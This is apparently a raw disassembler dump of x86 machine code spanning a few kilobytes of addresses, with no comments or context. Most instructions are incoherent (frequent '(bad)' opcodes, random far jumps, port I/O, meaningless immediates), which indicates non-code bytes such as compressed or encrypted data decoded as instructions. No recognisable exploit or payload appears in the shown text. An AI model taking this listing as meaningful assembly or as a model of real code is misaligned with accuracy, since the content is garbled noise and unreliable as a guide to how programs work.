  42d1c6:	mov    BYTE PTR gs:0x93350571,ah
  42d1cd:	mov    esp,0xb60253b5
  42d1d2:	xchg   esp,eax
  42d1d3:	and    BYTE PTR [ebx+edi*1-0x36],0x3
  42d1d8:	fsub   st,st(2)
  42d1da:	inc    edx
  42d1db:	cmp    ch,BYTE PTR [esi+0x31bb6855]
  42d1e1:	and    DWORD PTR [eax],0xb479865b
  42d1e7:	dec    ecx
  42d1e8:	jns    0x42d1be
  42d1ea:	aaa    
  42d1eb:	bound  esp,QWORD PTR [ebx+0x4a4194c5]
  42d1f1:	mov    bl,BYTE PTR [esi+0x89953b7]
  42d1f7:	adc    bh,dh
  42d1f9:	mov    edi,0x9d8e7bd8
  42d1fe:	jg     0x42d1f9
  42d200:	(bad)  
  42d201:	call   0x34f77f72
  42d206:	ret    0x8a5f
  42d209:	dec    edi
  42d20a:	xchg   ebp,eax
  42d20b:	mov    edi,0x28a676b6
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d22c
  42d281:	test   eax,0xe31073ec
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	and    eax,0x4419373a
  42d291:	add    eax,0xefb2b69b
  42d296:	fld    QWORD PTR [edi]
  42d298:	cmp    BYTE PTR [eax-0x4332fa70],al
  42d29e:	xor    DWORD PTR [eax+0x77b10cbc],ebx
  42d2a4:	sbb    bh,bh
  42d2a6:	and    edi,ecx
  42d2a8:	push   ebx
  42d2a9:	lods   al,BYTE PTR ds:[esi]
  42d2aa:	push   ss
  42d2ab:	sbb    esi,ecx
  42d2ad:	cmc    
  42d2ae:	add    eax,0x68156c51
  42d2b3:	dec    ebx
  42d2b4:	sub    al,0x9a
  42d2b6:	icebp  
  42d2b7:	lahf   
  42d2b8:	ins    BYTE PTR es:[edi],dx
  42d2b9:	xlat   BYTE PTR ds:[ebx]
  42d2ba:	(bad)  
  42d2bb:	fisttp QWORD PTR [esi]
  42d2bd:	data16 mov ?,WORD PTR [eax+eax*1]
  42d2c1:	sbb    eax,0x7ed1614c
  42d2c7:	arpl   WORD PTR es:[ecx+0x63],di
  42d2cb:	ins    DWORD PTR es:[edi],dx
  42d2cc:	push   eax
  42d2cd:	jmp    0x71768ae8
  42d2d2:	cs cmp al,0x1e
  42d2d5:	sub    DWORD PTR [eax-0x3393855d],ebp
  42d2db:	and    ebp,esp
  42d2dd:	rcl    DWORD PTR [ebx+0x13],1
  42d2e0:	sahf   
  42d2e1:	repz push ds
  42d2e3:	xor    DWORD PTR [eax],edi
  42d2e5:	pop    ebx
  42d2e6:	jmp    0x42d295
  42d2e8:	or     WORD PTR [ebp-0x77],cx
  42d2ec:	jg     0x42d32a
  42d2ee:	push   ebp
  42d2ef:	out    dx,eax
  42d2f0:	adc    BYTE PTR [ebx-0x53],cl
  42d2f3:	or     ch,al
  42d2f5:	stc    
  42d2f6:	xchg   edi,eax
  42d2f7:	mov    al,ds:0x39a0d5f4
  42d2fc:	mov    eax,ds:0x1eb7b43a
  42d301:	add    ebp,DWORD PTR [ecx-0x19c701ce]
  42d307:	loop   0x42d2d1
  42d309:	add    al,0xbd
  42d30b:	xlat   BYTE PTR ds:[ebx]
  42d30c:	out    dx,al
  42d30d:	push   edi
  42d30e:	scas   eax,DWORD PTR es:[edi]
  42d30f:	push   esi
  42d310:	lock mov DWORD PTR [esi],edx
  42d313:	jge    0x42d2bc
  42d315:	pop    edi
  42d316:	add    DWORD PTR [edx],0x4e
  42d319:	xor    eax,edx
  42d31b:	inc    esp
  42d31c:	add    al,0xcd
  42d31e:	add    bl,ah
  42d320:	sub    ah,ch
  42d322:	jnp    0x42d33d
  42d324:	pop    ss
  42d325:	dec    ecx
  42d326:	stc    
  42d327:	cmp    eax,0xcda9abb9
  42d32c:	mov    edx,0x34a1f9dd
  42d331:	jecxz  0x42d2de
  42d333:	dec    ebx
  42d334:	fwait
  42d335:	and    eax,0x7d194e7c
  42d33a:	repz mov edx,0xec369f66
  42d340:	add    al,0x27
  42d342:	fistp  DWORD PTR [eax]
  42d344:	or     al,0x64
  42d346:	mov    DWORD PTR [ecx+0x4e],eax
  42d349:	sub    eax,0xc6f49c31
  42d34e:	rcr    BYTE PTR ds:0x8baf7a56,1
  42d354:	adc    eax,0x221d07ba
  42d359:	idiv   BYTE PTR [ecx-0x15]
  42d35c:	adc    BYTE PTR [eax-0x4c],al
  42d35f:	dec    edi
  42d360:	push   esp
  42d361:	cmp    al,0xb3
  42d363:	not    DWORD PTR [edi-0x12be9b85]
  42d369:	xor    dl,BYTE PTR [edi]
  42d36b:	(bad)  
  42d36c:	shl    BYTE PTR [edx+0x375d18f8],cl
  42d372:	and    DWORD PTR [eax-0x4],edx
  42d375:	add    DWORD PTR [edx],esi
  42d377:	xchg   ecx,eax
  42d378:	bound  eax,QWORD PTR [ebx*4+0x58c9560a]
  42d37f:	test   bl,al
  42d381:	inc    ebp
  42d382:	into   
  42d383:	data16 jecxz 0x42d39f
  42d386:	push   0x196a19fc
  42d38b:	addr16 ret 0x68b5
  42d38f:	sub    al,BYTE PTR [eax]
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	or     DWORD PTR [ebx-0x1beb60bd],eax
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	mov    ds:0x9a2b3950,al
  42d411:	xor    eax,0xa54541a3
  42d416:	ret    0x50b
  42d419:	fstp   TBYTE PTR [edi+0x10]
  42d41c:	xor    esp,DWORD PTR [ebx+ecx*8-0x2cace183]
  42d423:	retf   0x9d4
  42d426:	jmp    0x40b6:0xcd1fc2ed
  42d42d:	sub    al,ah
  42d42f:	xchg   edx,eax
  42d430:	pop    eax
  42d431:	or     al,0x34
  42d433:	jmp    0xe6dd49
  42d438:	idiv   BYTE PTR [ebx-0x7e8f12e2]
  42d43e:	pop    es
  42d43f:	sub    cl,bl
  42d441:	rcr    BYTE PTR [ecx],0xe8
  42d444:	out    dx,eax
  42d445:	push   0x75
  42d447:	push   0xf1dbbe00
  42d44c:	std    
  42d44d:	sbb    cl,bh
  42d44f:	pop    ss
  42d450:	aad    0x2b
  42d452:	mov    dh,0x34
  42d454:	mov    esp,0xb3bc95f8
  42d459:	call   0xf677:0x51bba90
  42d460:	pop    ebx
  42d461:	aad    0xb5
  42d463:	push   eax
  42d464:	pusha  
  42d465:	cmp    al,0xd9
  42d467:	mov    ebp,DWORD PTR [ebx-0x66]
  42d46a:	dec    edi
  42d46b:	or     DWORD PTR [edx+0x5def8c0d],esp
  42d471:	repz fsub st(7),st
  42d474:	les    ecx,FWORD PTR [edx-0x4a5737ad]
  42d47a:	jo     0x42d41e
  42d47c:	add    BYTE PTR ds:0xd96d7d7d,0x69
  42d483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d484:	stc    
  42d485:	aad    0x90
  42d487:	int    0xf7
  42d489:	sbb    DWORD PTR [eax-0x46],esp
  42d48c:	pop    ebp
  42d48d:	add    eax,0x7edde57b
  42d492:	and    ah,dh
  42d494:	mov    ah,0x8b
  42d496:	je     0x42d507
  42d498:	(bad)  
  42d499:	xor    DWORD PTR [edi],esp
  42d49b:	xor    ch,bl
  42d49d:	add    ah,dh
  42d49f:	mov    esi,0xbf5b393b
  42d4a4:	(bad)  
  42d4a5:	out    0xe4,al
  42d4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4a8:	fs in  eax,0xe9
  42d4ab:	cs rcr BYTE PTR cs:[ebx],1
  42d4af:	aaa    
  42d4b0:	imul   DWORD PTR [edx+0x3c19bb3c]
  42d4b6:	ret    0x4502
  42d4b9:	pushf  
  42d4ba:	adc    BYTE PTR [ebx+0x7b838e48],cl
  42d4c0:	pop    ecx
  42d4c1:	je     0x42d4ba
  42d4c3:	push   esi
  42d4c4:	jmp    0x42d4a3
  42d4c6:	adc    al,BYTE PTR [esi]
  42d4c8:	xor    dh,BYTE PTR [ebx-0x69]
  42d4cb:	mov    edx,0x8718a880
  42d4d0:	mov    ah,0x7a
  42d4d2:	push   esp
  42d4d3:	ds je  0x42d4a2
  42d4d6:	xchg   ecx,eax
  42d4d7:	mov    dl,0x77
  42d4d9:	scas   al,BYTE PTR es:[edi]
  42d4da:	ss lock or ah,ch
  42d4de:	mov    ds:0x1ce63dc2,al
  42d4e3:	int    0xb5
  42d4e5:	fsubr  DWORD PTR ss:[ebx+0x7f]
  42d4e9:	(bad)  
  42d4ea:	inc    edx
  42d4eb:	fwait
  42d4ec:	ins    BYTE PTR es:[edi],dx
  42d4ed:	inc    ebx
  42d4ee:	rol    BYTE PTR [edi+0x60],cl
  42d4f1:	pop    eax
  42d4f2:	pushf  
  42d4f3:	xchg   BYTE PTR [ebx-0x3356a091],bl
  42d4f9:	sub    al,0xef
  42d4fb:	addr16 jnp 0x42d498
  42d4fe:	imul   BYTE PTR [ebp-0x29]
  42d501:	dec    edx
  42d502:	(bad)  [ebp-0x55]
  42d505:	push   eax
  42d506:	es add eax,0xb1804a3a
  42d50c:	jno    0x42d586
  42d50e:	int3   
  42d50f:	add    DWORD PTR [eax],eax
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x587376d5,eax
  42d583:	sbb    BYTE PTR [eax],0xe5
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	jmp    0xca0abb03
  42d591:	mov    gs,WORD PTR [eax-0x6d]
  42d594:	leave  
  42d595:	mov    WORD PTR [ebp-0x25],gs
  42d598:	aam    0x97
  42d59a:	fs clc 
  42d59c:	push   ss
  42d59d:	sbb    dl,cl
  42d59f:	jae    0x42d546
  42d5a1:	xchg   edi,eax
  42d5a2:	sbb    BYTE PTR [ebp-0x50327e83],dl
  42d5a8:	jbe    0x42d5b9
  42d5aa:	les    eax,FWORD PTR [eax-0x2b]
  42d5ad:	mov    edi,0x9cc4bbff
  42d5b2:	fstp   QWORD PTR [eax]
  42d5b4:	push   ebp
  42d5b5:	inc    edx
  42d5b6:	ret    0xc18b
  42d5b9:	xchg   ebx,eax
  42d5ba:	inc    ebp
  42d5bb:	jns    0x42d572
  42d5bd:	xchg   esi,eax
  42d5be:	out    0x4b,eax
  42d5c0:	es jo  0x42d60b
  42d5c3:	loop   0x42d60e
  42d5c5:	das    
  42d5c6:	fdivrp st(6),st
  42d5c8:	test   BYTE PTR ds:0x1faaaf5c,bl
  42d5ce:	hlt    
  42d5cf:	inc    edx
  42d5d0:	push   ecx
  42d5d1:	jns    0x42d642
  42d5d3:	arpl   WORD PTR [eax+edi*1],di
  42d5d6:	xor    DWORD PTR [ebx-0x6c],edx
  42d5d9:	and    edi,DWORD PTR [ebp+eax*4-0x3c]
  42d5dd:	fld    TBYTE PTR [edi-0x6c]
  42d5e0:	sbb    DWORD PTR [edx+edx*8-0x5c6a3897],ebp
  42d5e7:	mov    dl,0xf
  42d5e9:	dec    edx
  42d5ea:	jg     0x42d624
  42d5ec:	inc    edi
  42d5ed:	sub    eax,0xa1e1709e
  42d5f2:	repz les esp,FWORD PTR [ebx-0x2cd7f66]
  42d5f9:	clc    
  42d5fa:	ja     0x42d5dd
  42d5fc:	pop    eax
  42d5fd:	sub    BYTE PTR [esi],dl
  42d5ff:	gs lahf 
  42d601:	pushf  
  42d602:	mov    esi,0x69c67c1
  42d607:	and    BYTE PTR [edi],dl
  42d609:	out    0xc1,eax
  42d60b:	sbb    ebp,ebx
  42d60d:	in     al,0x32
  42d60f:	out    0xe8,eax
  42d611:	mov    al,ds:0xb257380d
  42d616:	push   ss
  42d617:	adc    al,0xf0
  42d619:	lea    ebx,[esi-0x492a6ad6]
  42d61f:	dec    ebx
  42d620:	push   edx
  42d621:	sar    edi,1
  42d623:	rol    BYTE PTR [edx],0xba
  42d626:	inc    ebp
  42d627:	ret    0x243d
  42d62a:	scas   eax,DWORD PTR es:[edi]
  42d62b:	push   esi
  42d62c:	lods   al,BYTE PTR ds:[esi]
  42d62d:	data16 and BYTE PTR [esi+0x5],0xc
  42d632:	push   es
  42d633:	sbb    al,0xde
  42d635:	daa    
  42d636:	mov    ebx,0x4d3c1349
  42d63b:	xchg   ecx,eax
  42d63c:	cs leave 
  42d63e:	inc    ebx
  42d63f:	mov    ds:0x15b08292,eax
  42d644:	mov    al,0x6b
  42d646:	and    DWORD PTR [ecx+eiz*8-0x44],0x9520312a
  42d64e:	ins    DWORD PTR es:[edi],dx
  42d64f:	inc    edx
  42d650:	out    dx,al
  42d651:	lds    ebx,FWORD PTR [edx+0x7dbcb1e7]
  42d657:	nop
  42d658:	jne    0x42d674
  42d65a:	into   
  42d65b:	into   
  42d65c:	adc    esi,ecx
  42d65e:	fnstcw WORD PTR [ebp-0xee11abf]
  42d664:	xchg   edi,eax
  42d665:	scas   al,BYTE PTR es:[edi]
  42d666:	not    BYTE PTR [ebp+0x2d6b8eab]
  42d66c:	pop    esi
  42d66d:	inc    eax
  42d66e:	adc    esi,ecx
  42d670:	fs mov ah,0x71
  42d673:	pop    edx
  42d674:	(bad)  
  42d675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d676:	test   DWORD PTR [eax-0x20d9e3aa],edi
  42d67c:	mov    ds:0x8d48ac16,al
  42d681:	mov    dl,0xfc
  42d683:	inc    esi
  42d684:	dec    ebx
  42d685:	rcr    DWORD PTR [esi+eax*1-0x2f],0x5d
  42d68a:	mov    BYTE PTR [ebx+ebx*4-0x45],cl
  42d68e:	mov    dl,0xb3
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xef
  42d701:	lahf   
  42d702:	add    eax,0x1e61c61
  42d707:	add    BYTE PTR [ecx+eax*1],al
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	sti    
  42d70d:	in     eax,dx
  42d70e:	mov    DWORD PTR [ecx-0x7c],ebx
  42d711:	jbe    0x42d76d
  42d713:	and    cl,BYTE PTR [edx]
  42d715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d716:	pusha  
  42d717:	das    
  42d718:	mov    al,0x6f
  42d71a:	pop    es
  42d71b:	popa   
  42d71c:	aaa    
  42d71d:	cdq    
  42d71e:	cmp    eax,0x7864e4fc
  42d723:	cmp    edx,DWORD PTR [ecx+0x102f99ac]
  42d729:	push   ebp
  42d72a:	dec    esp
  42d72b:	unpckhps xmm2,XMMWORD PTR ds:0xb51cfd3
  42d732:	push   ss
  42d733:	sub    BYTE PTR [ebx+0x77],0x3e
  42d737:	or     al,0x4b
  42d739:	mov    bl,0x90
  42d73b:	inc    edi
  42d73c:	xlat   BYTE PTR ds:[ebx]
  42d73d:	inc    edx
  42d73e:	test   al,0x27
  42d740:	int3   
  42d741:	dec    ebx
  42d742:	mov    ds:0x605731f,al
  42d747:	icebp  
  42d748:	stc    
  42d749:	mov    ebp,0xfa3d82cb
  42d74e:	retf   0x91fe
  42d751:	mov    al,0x0
  42d753:	inc    esp
  42d754:	iret   
  42d755:	xchg   ecx,eax
  42d756:	xchg   esp,eax
  42d757:	js     0x42d703
  42d759:	popa   
  42d75a:	jb     0x42d72c
  42d75c:	lea    ebx,[ebp-0x11]
  42d75f:	adc    eax,0x40911d32
  42d764:	cwde   
  42d765:	aam    0xcf
  42d767:	xor    bh,BYTE PTR [ecx-0x20b4b827]
  42d76d:	push   0xba950f21
  42d772:	add    al,0xc6
  42d774:	out    dx,al
  42d775:	daa    
  42d776:	mov    ds:0x5ed86393,al
  42d77b:	pop    esi
  42d77c:	xchg   ebp,eax
  42d77d:	cs push 0xd664920
  42d783:	fsubr  DWORD PTR [ebp-0x222a6c72]
  42d789:	(bad)  
  42d78a:	xor    esi,DWORD PTR [ecx]
  42d78c:	mov    al,ds:0xbded9ba3
  42d791:	loope  0x42d7cf
  42d793:	out    dx,al
  42d794:	mov    ds:0xfe03081f,eax
  42d799:	add    eax,0xa4708be1
  42d79e:	dec    edx
  42d79f:	sahf   
  42d7a0:	xchg   esp,eax
  42d7a1:	scas   eax,DWORD PTR es:[edi]
  42d7a2:	shl    esp,1
  42d7a4:	xlat   BYTE PTR ds:[ebx]
  42d7a5:	(bad)
  42d7a8:	jmp    0x25636d3e
  42d7ad:	idiv   BYTE PTR [edi+0x47acfd59]
  42d7b3:	inc    ebp
  42d7b4:	jmp    0x5e334c7f
  42d7b9:	shl    DWORD PTR [ebp-0x53],cl
  42d7bc:	mov    eax,ds:0x9bcb9046
  42d7c1:	pop    ds
  42d7c2:	pop    ebp
  42d7c3:	cmp    dh,ch
  42d7c5:	xchg   ecx,edx
  42d7c7:	mov    eax,ds:0x752af29a
  42d7cc:	stos   DWORD PTR es:[edi],eax
  42d7cd:	ds ins BYTE PTR es:[edi],dx
  42d7cf:	mov    esp,0xd07b65dc
  42d7d4:	(bad)  
  42d7d5:	std    
  42d7d6:	push   ebx
  42d7d7:	inc    eax
  42d7d8:	cmp    BYTE PTR [eax],al
  42d7da:	dec    esp
  42d7db:	cwde   
  42d7dc:	sbb    edx,edi
  42d7de:	fild   DWORD PTR [ecx]
  42d7e0:	retf   
  42d7e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7e2:	sub    DWORD PTR [ecx],edx
  42d7e4:	cli    
  42d7e5:	stos   BYTE PTR es:[edi],al
  42d7e6:	stc    
  42d7e7:	cmp    DWORD PTR [edx],ebx
  42d7e9:	call   0x2170:0xcb33b46c
  42d7f0:	mov    al,0xab
  42d7f2:	das    
  42d7f3:	inc    eax
  42d7f4:	or     eax,0x160f1e2c
  42d7f9:	es daa 
  42d7fb:	aad    0xaa
  42d7fd:	push   edx
  42d7fe:	cmc    
  42d7ff:	cmp    edx,esp
  42d801:	mov    ch,0x71
  42d803:	out    0x17,eax
  42d805:	js     0x42d87e
  42d807:	jmp    0x42d7f9
  42d809:	gs xchg esi,eax
  42d80b:	sbb    di,WORD PTR [edi]
  42d80e:	inc    edi
  42d80f:	fild   DWORD PTR [eax]
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xc4c6961a
  42d881:	adc    edi,DWORD PTR [edi+0x60]
  42d884:	and    bh,ah
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	cwde   
  42d88d:	adc    bh,dh
  42d88f:	mov    ds:0xd4438a6b,al
  42d894:	pop    edx
  42d895:	and    eax,0x12765901
  42d89a:	sub    esp,DWORD PTR [edx-0x58]
  42d89d:	xchg   esp,eax
  42d89e:	jb     0x42d8e0
  42d8a0:	and    eax,0xa55a9f24
  42d8a5:	xor    BYTE PTR [ecx],ah
  42d8a7:	adc    BYTE PTR [ecx-0x4b545fe2],0xf2
  42d8ae:	cwde   
  42d8af:	xor    al,0x4d
  42d8b1:	pop    ds
  42d8b2:	fadd   st(7),st
  42d8b4:	ins    DWORD PTR es:[edi],dx
  42d8b5:	(bad)  
  42d8b6:	xchg   ecx,eax
  42d8b7:	fimul  DWORD PTR [esi-0x50e1fb10]
  42d8bd:	ds push ss
  42d8bf:	mov    ebp,0x3e878aba
  42d8c4:	stc    
  42d8c5:	jmp    0x42d91d
  42d8c7:	cmp    ebp,DWORD PTR [esi+0x7a9a9ea1]
  42d8cd:	xor    eax,0xf2586c4d
  42d8d2:	xor    al,0xba
  42d8d4:	mov    esp,0xc746a995
  42d8d9:	dec    esp
  42d8da:	and    dl,ah
  42d8dc:	inc    esp
  42d8dd:	push   esi
  42d8de:	(bad)  
  42d8df:	jle    0x42d87c
  42d8e1:	in     eax,0xf8
  42d8e3:	inc    edx
  42d8e4:	sbb    BYTE PTR [edx-0x76],0x45
  42d8e8:	(bad)  
  42d8e9:	rol    BYTE PTR ds:0x7e3d3950,1
  42d8ef:	shl    DWORD PTR [edi+0x68],0x16
  42d8f3:	xor    BYTE PTR [esi+0x2b],cl
  42d8f6:	mov    eax,0xb3ffd3ee
  42d8fb:	push   ds
  42d8fc:	fdivr  QWORD PTR [ebx-0x5de21695]
  42d902:	jecxz  0x42d8b7
  42d904:	aaa    
  42d905:	cmp    BYTE PTR [ebx+0xa],0x2d
  42d909:	(bad)  
  42d90a:	jmp    0xd5b9:0x6ab4725d
  42d911:	push   esi
  42d912:	inc    ebx
  42d913:	inc    edi
  42d914:	inc    edx
  42d915:	add    eax,0x2deeb95c
  42d91a:	ficomp DWORD PTR [ecx]
  42d91c:	adc    eax,0x72ffac1b
  42d921:	fldcw  WORD PTR [eax-0x45b9575]
  42d927:	mov    DWORD PTR [edx+0x717d36ab],ebp
  42d92d:	inc    ebx
  42d92e:	jmp    0x699a:0xb47f96d
  42d935:	lock cmp al,0xe6
  42d938:	fbstp  TBYTE PTR [eax+0x107f9abd]
  42d93e:	xchg   edx,eax
  42d93f:	cmp    al,0xcb
  42d941:	ins    DWORD PTR es:[edi],dx
  42d942:	mov    eax,0x561135d1
  42d947:	xchg   esi,eax
  42d948:	out    dx,eax
  42d949:	mov    esi,0xbab1a7cd
  42d94e:	push   ebp
  42d94f:	mov    eax,ds:0xc1d3bea1
  42d954:	mov    al,ds:0xb34337e
  42d959:	dec    ebp
  42d95a:	xor    eax,0x614f099e
  42d95f:	sbb    al,0x55
  42d961:	jo     0x42d99b
  42d963:	or     DWORD PTR [ebx-0x1e],edi
  42d966:	or     dl,al
  42d968:	push   es
  42d969:	mov    edx,0x539214f1
  42d96e:	aas    
  42d96f:	popa   
  42d970:	dec    edi
  42d971:	sbb    al,0x33
  42d974:	or     al,0x5d
  42d976:	or     BYTE PTR [edx+0x5eb8c16],dh
  42d97c:	xchg   ebx,eax
  42d97d:	popf   
  42d97e:	xor    esi,0xe9768b13
  42d984:	arpl   WORD PTR [esi+0x7],ax
  42d987:	in     eax,0xf6
  42d989:	lods   al,BYTE PTR ds:[esi]
  42d98a:	leave  
  42d98b:	cdq    
  42d98c:	std    
  42d98d:	lock pop ecx
  42d98f:	jbe    0x42d991
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	aas    
  42da01:	lds    edi,FWORD PTR [edi+0xc]
  42da04:	and    al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	push   edi
  42da0d:	into   
  42da0e:	pop    ss
  42da0f:	cmp    DWORD PTR [edx-0x4ad255f1],ecx
  42da15:	test   eax,0xdc744ff7
  42da1a:	in     eax,0x5d
  42da1c:	jae    0x42da85
  42da1e:	enter  0x974b,0x10
  42da22:	mov    cl,0xf8
  42da24:	sbb    ch,BYTE PTR [esi+ebp*8-0x4504b409]
  42da2b:	div    ecx
  42da2d:	je     0x42da3e
  42da2f:	sti    
  42da30:	in     eax,dx
  42da31:	adc    bh,BYTE PTR [edx-0x43]
  42da34:	mov    dl,0x7e
  42da36:	xchg   esp,eax
  42da37:	cmc    
  42da38:	jge    0x42daa6
  42da3a:	xor    DWORD PTR [ebp-0x23],ecx
  42da3d:	xchg   ecx,eax
  42da3e:	std    
  42da3f:	aam    0xd0
  42da41:	int3   
  42da42:	jecxz  0x42da7f
  42da44:	mov    ds:0x216a1e81,eax
  42da49:	sti    
  42da4a:	jne    0x42d9e4
  42da4c:	mov    BYTE PTR [edx+0x7],dl
  42da4f:	push   edx
  42da50:	and    BYTE PTR [ebp-0x13d9878e],bh
  42da56:	lahf   
  42da57:	adc    ecx,DWORD PTR [ebx-0x6e]
  42da5a:	mov    DWORD PTR [edi+0x1c73c594],esi
  42da60:	jecxz  0x42dacb
  42da62:	(bad)  [esi-0x18146391]
  42da68:	push   edi
  42da69:	lds    ecx,FWORD PTR [eax+0x49f5edfd]
  42da6f:	push   esp
  42da70:	sahf   
  42da71:	out    0xd8,eax
  42da73:	je     0x42da43
  42da75:	jmp    DWORD PTR ds:0xf1d2fe94
  42da7b:	xor    BYTE PTR [ecx+0x13],bh
  42da7e:	push   ecx
  42da7f:	into   
  42da80:	mov    edi,0xb67e06de
  42da85:	ss mov dl,0x1f
  42da88:	ins    BYTE PTR es:[edi],dx
  42da89:	mov    bh,0x59
  42da8b:	scas   eax,DWORD PTR es:[edi]
  42da8c:	stos   DWORD PTR es:[edi],eax
  42da8d:	sub    BYTE PTR [edx-0x455bab90],bl
  42da93:	clc    
  42da94:	retf   0x83ec
  42da97:	jae    0x42dadd
  42da99:	and    dh,ch
  42da9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da9c:	std    
  42da9d:	pop    edi
  42da9e:	fcomp  DWORD PTR [eax+ebp*4]
  42daa1:	sub    dh,BYTE PTR [eax]
  42daa3:	mov    al,ds:0xc8ecd560
  42daa8:	out    0xc2,al
  42daaa:	shl    bh,cl
  42daac:	sbb    ebx,DWORD PTR [ecx-0x2a420f3b]
  42dab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dab3:	cmp    al,0x72
  42dab5:	push   ecx
  42dab6:	test   eax,0x48b47226
  42dabb:	mov    ax,ds:0xd3348cfa
  42dac1:	sub    DWORD PTR [ecx+0x6d39b1a7],esp
  42dac7:	xchg   edx,eax
  42dac8:	(bad)  
  42dac9:	sar    BYTE PTR [edx],0xdc
  42dacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dacd:	in     al,0xbc
  42dacf:	fdivr  DWORD PTR [ebx]
  42dad1:	xchg   BYTE PTR [ebx-0x17c93e71],bl
  42dad7:	dec    eax
  42dad8:	popa   
  42dad9:	sbb    al,0x54
  42dadb:	out    0x43,eax
  42dadd:	out    dx,al
  42dade:	inc    esi
  42dadf:	aaa    
  42dae0:	xor    dh,ah
  42dae2:	xor    dl,BYTE PTR [esi+0x1d]
  42dae5:	shr    dl,cl
  42dae7:	adc    esi,0xfffffffe
  42daea:	fisubr DWORD PTR [edx-0x19121bf1]
  42daf0:	out    dx,al
  42daf1:	push   ds
  42daf2:	pop    es
  42daf3:	fstp   DWORD PTR [ebp+ebx*1+0x9]
  42daf7:	popf   
  42daf8:	inc    esp
  42daf9:	shl    ecx,1
  42dafb:	(bad)  
  42dafc:	lock adc edi,ebp
  42daff:	xlat   BYTE PTR ds:[ebx]
  42db00:	sub    al,0x4d
  42db02:	pop    ebx
  42db03:	sbb    BYTE PTR [eiz*1+0x2e7f7194],dh
  42db0a:	adc    esi,DWORD PTR [ebx]
  42db0c:	mov    ebp,0xf483df
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbec
  42db81:	mov    bh,0x16
  42db83:	pop    ebx
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	test   eax,0x780d6c14
  42db91:	clc    
  42db92:	jno    0x42dbed
  42db94:	dec    esi
  42db95:	mov    dl,0x18
  42db97:	or     al,0xbe
  42db99:	xor    al,0x2c
  42db9b:	jbe    0x42db8d
  42db9d:	cwde   
  42db9e:	mov    ecx,0xa2aeafbb
  42dba3:	and    ch,BYTE PTR [ecx+0x6ad24615]
  42dba9:	les    edi,FWORD PTR [eax]
  42dbab:	inc    ebp
  42dbac:	pop    esi
  42dbad:	add    eax,0xdf193387
  42dbb2:	pushf  
  42dbb3:	iret   
  42dbb4:	popa   
  42dbb5:	mov    dh,0x30
  42dbb7:	dec    ecx
  42dbb8:	es (bad) 
  42dbbb:	mov    WORD PTR [ebx+0x40],fs
  42dbbe:	push   edi
  42dbbf:	int    0x47
  42dbc1:	xor    eax,0xf52ff57b
  42dbc6:	or     ah,dh
  42dbc8:	adc    al,0x5e
  42dbca:	outs   dx,DWORD PTR ds:[esi]
  42dbcb:	mov    esp,0xf3a4437
  42dbd0:	mov    ebp,0x5ced999a
  42dbd5:	scas   eax,DWORD PTR es:[edi]
  42dbd6:	jmp    0x42db6c
  42dbd8:	int    0xcc
  42dbda:	mov    ah,0x7e
  42dbdc:	mov    ds:0xf73d7798,eax
  42dbe1:	inc    ecx
  42dbe2:	lea    ebx,[ebx]
  42dbe4:	pop    esp
  42dbe5:	adc    eax,0xb7c28b95
  42dbea:	push   ds
  42dbeb:	dec    ebx
  42dbec:	lods   al,BYTE PTR ds:[esi]
  42dbed:	mov    al,ds:0x46175156
  42dbf2:	dec    ebp
  42dbf3:	call   0x2eca:0x87323c80
  42dbfa:	cmc    
  42dbfb:	sbb    al,0xb9
  42dbfd:	icebp  
